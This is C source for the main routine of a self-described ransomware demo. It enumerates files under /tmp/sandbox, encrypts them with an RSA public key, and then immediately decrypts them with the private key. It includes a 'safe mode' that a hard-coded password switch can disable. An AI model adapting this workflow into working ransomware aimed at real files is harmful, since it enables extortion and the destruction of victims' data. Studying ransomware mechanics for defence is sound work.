#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/decoder.h>

#include "files_finder.h"
#include "crypto.h"

int g_safeMode = 1;

OSSL_DECODER_CTX *dctx;
EVP_PKEY *pkey = NULL;
const char *format = "PEM";   /* NULL for any format */
const char *structure = NULL; /* any structure */
const char *keytype = "RSA";  /* NULL for any key */
const unsigned char *pass = NULL;

/**
 * @brief Initialize an area with useless files to execute the ransomware in safe mode.
*/
void init_safe_mode_area()
{
    /* Create sandbox directory in /tmp/ */
    char* p_sandboxPath = "/tmp/sandbox";
    if (mkdir(p_sandboxPath, 0777) == -1)
    {
        perror("[-] Sandbox directory creation failed");
        exit(1);
    }

    /* Create useless files in sandbox directory */
    char* p_files[] = {"file1", "file2", "file3", "file4", "file5"};
    for (int i = 0; i < 5; i++)
    {
        /* Allocate memory to files path */
        char* p_filePath = malloc(strlen(p_sandboxPath) + strlen(p_files[i]) + 2);
        if (p_filePath == NULL)
        {
            perror("[-] Sandbox files creation failed");
            exit(1);
        }
        sprintf(p_filePath, "%s/%s", p_sandboxPath, p_files[i]);
        FILE* p_file = fopen(p_filePath, "w");
        if (p_file == NULL)
        {
            perror("[-] Sandbox files creation failed");
            exit(1);
        }

        /* Fill files with data */
        fprintf(p_file, "This is a useless file\n");

        /* Close file descriptor */
        fclose(p_file);

        /* Free memory */
        free(p_filePath);
    }

    printf("[+] Safe mode area initialized\n");

}

int main(int argc, char const *argv[])
{

    char* paths[] = {"/tmp/sandbox/"};

    /* Parse options */
    if (argc != 3)
    {
        printf("[+] Ransomware in safe mode\n");
        init_safe_mode_area();
    } else {
        /* Test if password is correct to disable safe mode */
        if (strcmp(argv[1], "--disableSM") == 0)
        {
            if (strcmp(argv[2], "286755fad04869ca523320acce0dc6a4") == 0)
            {
                printf("[+] Safe mode disabled\n");
                g_safeMode = 0;
            }
        } 
    }

    listFileData* p_listFileData = init_list_file_data();
    files_finder(p_listFileData, paths, 1);
    print_path_data(p_listFileData);

    /* Get RSA public key from a file */
    FILE* p_pubKeyFile = fopen("public.pem", "r");
    if (p_pubKeyFile == NULL)
    {
        perror("[-] Encryption key GET failed");
        exit(1);
    }
    RSA* p_pubKey = PEM_read_RSAPublicKey(p_pubKeyFile, NULL, NULL, NULL);
    //RSA_print_fp(stdout, p_pubKey, 0);

    fclose(p_pubKeyFile);

    printf("[+] Encryption key GET success\n");

    /* Encrypt files */
    printf("[+] Encrypting files\n");
    encrypt_files(p_listFileData, p_pubKey);
    printf("[+] Files encrypted\n");

    RSA_free(p_pubKey);

    /* Get RSA private key from a file */
    FILE* p_privKeyFile = fopen("private.pem", "r");
    if (p_privKeyFile == NULL)
    {
        perror("[-] Decryption key GET failed");
        exit(1);
    }
    RSA* p_privKey = PEM_read_RSAPrivateKey(p_privKeyFile, NULL, NULL, NULL);

    fclose(p_privKeyFile);

    printf("[+] Encryption key GET success\n");

    /* Decrypt files */
    printf("[+] Decrypting files\n");
    decrypt_files(p_listFileData, p_privKey);
    printf("[+] Files decrypted\n");

    RSA_free(p_privKey);


    //dctx = OSSL_DECODER_CTX_new_for_pkey(&pkey, format, structure,
    //                                 keytype,
    //                                 OSSL_KEYMGMT_SELECT_KEYPAIR,
    //                                 NULL, NULL);
    //
    //
    //if (dctx == NULL) {
    ///* error: no suitable potential decoders found */
    //}
    //if (pass != NULL)
    //    OSSL_DECODER_CTX_set_passphrase(dctx, pass, strlen(pass));
    //if (OSSL_DECODER_from_fp(dctx, p_pubKeyFile)) {
    //    /* pkey is created with the decoded data from the bio */
    //} else {
    //    /* decoding failure */
    //}
    //OSSL_DECODER_CTX_free(dctx);

    free_path_data(p_listFileData);
    return 0;
}
